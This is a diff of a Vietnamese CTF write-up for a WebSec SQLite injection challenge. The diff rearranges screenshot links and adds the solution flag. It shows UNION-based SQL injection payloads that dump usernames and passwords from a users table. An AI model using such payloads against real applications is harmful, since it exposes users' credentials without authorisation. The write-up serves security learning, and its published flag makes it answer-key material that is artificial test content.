@@ -16,9 +16,15 @@ Sau đó test thử payload với column = 2 để kiểm tra lỗ hổng => pay
 ```sql
 1 union select 1,group_concat(username) from users;
 ```
-![id](https://github.com/tinasahara1/Study/blob/3bcf48f054953d8366acef0111ed71c7239dc71f/WebSec/image/id_flag.PNG)
+
+![id](https://github.com/tinasahara1/Study/blob/70136a974f491dc499021b4fc7152f83dfa8a9a3/WebSec/image/id_4.PNG)
+
 
 Nhưng vẫn không thấy ta thử tiếp phần password và tìm thấy flag :
 ```sql
 1 union select 1,group_concat(password) from users;
 ```
+
+![id](https://github.com/tinasahara1/Study/blob/3bcf48f054953d8366acef0111ed71c7239dc71f/WebSec/image/id_flag.PNG)
+
+Flag: `WEBSEC{Simple_SQLite_Injection}`
